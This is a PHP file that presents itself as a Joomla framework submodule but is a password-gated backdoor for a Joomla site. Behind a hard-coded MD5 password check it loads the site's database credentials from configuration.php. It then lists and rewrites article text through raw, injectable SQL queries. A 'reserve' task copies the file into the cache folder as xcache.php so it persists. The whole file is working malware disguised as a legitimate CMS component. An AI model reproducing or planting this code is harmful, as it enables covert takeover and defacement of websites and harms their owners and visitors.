<?php
//CREATED BY JOOMLA.ORG 
//JOOMLA BASE FRAMEWORK
//SUBMODULE FOR ANY COMPONENTS
Header("Content-Type: text/html; charset=utf8"); 

session_start();
session_register("pass");

if (!empty($_POST['pass']) && md5($_POST['pass'])=='ff0a0e393d71d0e1d74e7d0bd3093f3a')
	{
	$pass=md5($_POST['pass']);
	$_SESSION['pass']=md5($_POST['pass']);
	} 

if (empty($_SESSION['pass']))
	{
	?>
	<html>
	<body>
	<form action="" method="post">
	Password: <input name="pass" type="text" /><input name="send" type="submit" value="send" />
	</form>
	</body>
	<?php
	die();
	}
if (file_exists("../../configuration.php")) include("../../configuration.php");
if (file_exists("../configuration.php")) include("../configuration.php");


$config=new JConfig();

$dblink = mysql_connect($config->host,$config->user,$config->password)
	or die(mysql_error());
mysql_select_db($config->db)
	or die(mysql_error());
mysql_query("SET NAMES 'utf8'");	

$task=$_GET['task'];

if (empty($task))
	{
	?>
	<html>
	<body>
	1) <a href="?task=content">SELECT ARTICLES</a><br />
	2) <a href="?task=reserve">CREATE RESERVE COPY</a> <?php if (is_writable("../../cache")) echo "writable"; else echo "not writable"; ?><br />
	</body>
	</html>
	<?php
	}
	
if ($task=='content')
	{
	?>
	<html>
	<body>
	<?php 
	$query="SELECT * FROM ".$config->dbprefix."content ORDER BY id LIMIT 300";
	$res=mysql_query($query);
	for($z=0;$z<mysql_num_rows($res);$z++)
		{
		$row=mysql_fetch_array($res);
		echo $row['id'].") <a href='?task=article&id=".$row['id']."'>".$row['title']."</a><br>";
		}
	?>
	</body>
	</html>
	<?php
	}	
	
if ($task=='article')
	{
	$id=$_GET['id'];
	?>
	<html>
	<body>
	<?php 
	$query="SELECT * FROM ".$config->dbprefix."content WHERE id='".$id."'";
	$res=mysql_query($query);
	$row=mysql_fetch_array($res);	
	?>
	<form action="?task=save&id=<?php echo $id; ?>" method="post">
	<textarea name="intro" cols="90" rows="10"><?php echo $row['introtext']; ?></textarea><br /><br />
	<textarea name="full" cols="90" rows="20"><?php echo $row['fulltext']; ?></textarea><br /><br />
MODE: <br>
<input type="radio" name="mode" value="1" checked>Standart<br>
<input type="radio" name="mode" value="2">Add slashes<br>
<br><br>
	<input name="send" type="submit" />
	</form>
	</body>
	</html>
	<?php
	}		
	
if ($task=='save')
	{
	$id=$_GET['id'];
	?>
	<html>
	<body>
	<?php 
	if ($_POST['mode']=='1') $query="UPDATE ".$config->dbprefix."content SET `introtext`='".$_POST['intro']."', `fulltext`='".$_POST['full']."' WHERE id='".$id."'";
	if ($_POST['mode']=='2') $query="UPDATE ".$config->dbprefix."content SET `introtext`='".addslashes($_POST['intro'])."', `fulltext`='".addslashes($_POST['full'])."' WHERE id='".$id."'";
	$res=mysql_query($query);
	?>
	READY
	</body>
	</html>
	<?php
	}		
	
if ($task=='reserve')
	{
	copy("framework.php", "../../cache/xcache.php");
	echo "file copied";
	}				
?>